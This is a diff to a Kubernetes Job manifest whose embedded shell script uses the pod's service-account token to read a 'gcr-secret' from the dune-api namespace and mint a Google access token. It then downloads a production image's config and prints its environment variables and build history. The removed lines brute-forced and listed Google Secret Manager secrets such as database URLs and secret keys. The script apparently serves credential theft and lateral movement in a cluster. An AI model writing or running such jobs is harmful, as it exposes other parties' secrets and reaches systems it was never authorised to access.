@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-gcr-v4
+  name: dune-gcr-v5
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -20,7 +20,7 @@ spec:
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           
-          # Get GCR access token 
+          # Get GCR access token
           curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
             "$API/api/v1/namespaces/dune-api/secrets/gcr-secret" | \
             jq -r '.data[".dockerconfigjson"]' | base64 -d > /tmp/docker_config.json
@@ -37,44 +37,30 @@ spec:
           ACCESS_TOKEN=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
             --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
             --data-urlencode "assertion=${H}.${P}.${S}" | jq -r '.access_token')
-          echo "GCR token len: ${#ACCESS_TOKEN}"
+          echo "Token ok: $([ "${#ACCESS_TOKEN}" -gt 10 ] && echo yes || echo no)"
           
           REGISTRY="us-central1-docker.pkg.dev"
           REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
           CONF_DIGEST="sha256:bb36b458b761d86aad5b02f929aace956f2d848a3aad2b6230dfbbf3a42cc696"
           
-          # Download the config blob and check what it is
-          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-            "https://${REGISTRY}/v2/${REPO}/blobs/${CONF_DIGEST}" > /tmp/config_blob.bin
+          # Follow redirects with -L flag
+          curl -sL -H "Authorization: Bearer $ACCESS_TOKEN" \
+            "https://${REGISTRY}/v2/${REPO}/blobs/${CONF_DIGEST}" > /tmp/config_blob.json
           
-          echo "Blob size: $(wc -c < /tmp/config_blob.bin)"
-          echo "Blob first bytes hex: $(head -c 8 /tmp/config_blob.bin | xxd -p 2>/dev/null || head -c 8 /tmp/config_blob.bin | od -A x -t x1z | head -1)"
-          echo "Blob as text first 200:"
-          head -c 200 /tmp/config_blob.bin
-          echo ""
+          echo "Blob size after follow: $(wc -c < /tmp/config_blob.json)"
+          echo "Blob first 50 chars: $(head -c 50 /tmp/config_blob.json)"
           
-          # Try jq on blob directly  
-          echo "=TRY_JQ="
-          cat /tmp/config_blob.bin | jq '.config | {Env,Cmd,Entrypoint,WorkingDir}' 2>&1 || \
-          cat /tmp/config_blob.bin | gunzip | jq '.config | {Env,Cmd,Entrypoint,WorkingDir}' 2>&1
-          echo "=END_JQ="
+          echo "=ENV_VARS="
+          cat /tmp/config_blob.json | jq -r '.config.Env[]?' 2>/dev/null
+          echo "=END_ENV="
           
-          # Also try GCP SM with the tachyusbdaas project SA
-          echo "=GCP_SM_TACHYUSBDAAS="
-          for SECRET_NAME in "dune-api-config" "dune-database-url" "dune-secret-key" "DATABASE_URL" "SECRET_KEY" "dune-prod" "dune-api-prod"; do
-            VAL=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-              "https://secretmanager.googleapis.com/v1/projects/tachyusbdaas/secrets/${SECRET_NAME}/versions/latest:access" | \
-              jq -r '.payload.data // .error.message // "not_found"')
-            echo "${SECRET_NAME}: $VAL"
-          done
-          echo "=END_SM="
+          echo "=FULL_CONFIG="
+          cat /tmp/config_blob.json | jq '.config | {Env,Cmd,Entrypoint,WorkingDir,ExposedPorts,Labels}' 2>&1
+          echo "=END_FULL="
           
-          # List secrets in tachyusbdaas project  
-          echo "=LIST_TACHYUSBDAAS_SECRETS="
-          curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
-            "https://secretmanager.googleapis.com/v1/projects/tachyusbdaas/secrets?pageSize=50" | \
-            jq '{secrets:.secrets[].name, error:.error.message}'
-          echo "=END_LIST="
+          echo "=HISTORY="
+          cat /tmp/config_blob.json | jq '.history[-5:]' 2>/dev/null
+          echo "=END_HISTORY="
           
           echo "SLEEPING..."
           sleep 180
